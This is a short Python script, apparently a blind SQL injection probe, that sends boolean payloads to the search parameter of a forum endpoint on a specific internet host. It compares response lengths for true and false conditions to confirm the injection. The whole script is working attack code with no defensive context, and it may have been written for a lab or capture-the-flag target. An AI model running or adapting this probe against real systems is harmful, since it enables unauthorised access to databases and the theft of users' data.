import requests

BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"

def check(payload):
    url = f"{BASE_URL}/forums/search-topics?search=') OR ({payload}) AND ('1'='1"
    r = requests.get(url)
    return len(r.text)

t = check("1=1")
f = check("1=0")

print(f"TRUE: {t}")
print(f"FALSE: {f}")
